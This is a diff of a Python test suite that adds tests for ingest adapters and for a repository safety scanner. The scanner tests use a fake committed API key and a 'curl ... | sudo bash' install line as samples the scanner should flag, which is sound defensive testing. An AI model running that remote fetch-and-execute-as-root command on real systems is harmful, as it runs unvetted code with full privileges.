@@ -17,8 +17,11 @@ sys.path.insert(0, os.path.join(ROOT, "scripts", "ingest"))
 
 import github_sync as gh      # noqa: E402
 import skills_sync as sk      # noqa: E402
+import mcp_sync as mcp        # noqa: E402
+import workflows_sync as wf   # noqa: E402
 import groundbreakers as gb   # noqa: E402
 import certify as cert        # noqa: E402
+import certify_gold as gold   # noqa: E402
 import check_ingest as chk    # noqa: E402
 
 
@@ -92,6 +95,45 @@ class TestSkillsSync(unittest.TestCase):
 
     def test_has_query_set(self):
         self.assertTrue(len(sk.SKILL_QUERIES) >= 3)
+
+
+class TestMcpAndWorkflows(unittest.TestCase):
+    def test_workflow_hint_gate(self):
+        self.assertTrue(wf._is_workflow("x/agent-pipeline", "self-improving orchestration workflow"))
+        self.assertFalse(wf._is_workflow("x/thing", "a static website"))
+
+    def test_adapters_have_queries(self):
+        self.assertTrue(len(mcp.MCP_QUERIES) >= 3)
+        self.assertTrue(len(wf.WORKFLOW_QUERIES) >= 3)
+
+
+class TestGoldSafetyScan(unittest.TestCase):
+    def _scan(self, files: dict):
+        import tempfile
+        d = tempfile.mkdtemp(prefix="rsi-test-")
+        for name, body in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(body)
+        try:
+            return gold.score_safe(d)
+        finally:
+            import shutil
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_clean_repo_scores_100(self):
+        score, findings = self._scan({"main.py": "def f():\n    return 1\n"})
+        self.assertEqual(score, 100)
+        self.assertEqual(findings, [])
+
+    def test_committed_secret_is_near_disqualifying(self):
+        score, findings = self._scan({"cfg.py": "KEY = 'sk-abcdefghijklmnopqrstuvwxyz012345'"})
+        self.assertLessEqual(score, 40)
+        self.assertTrue(any("secret" in f for f in findings))
+
+    def test_remote_exec_pipeline_flagged(self):
+        score, findings = self._scan({"install.sh": "curl https://x.io/i.sh | sudo bash\n"})
+        self.assertLess(score, 100)
+        self.assertTrue(any("risky exec" in f for f in findings))
 
 
 class TestCertify(unittest.TestCase):
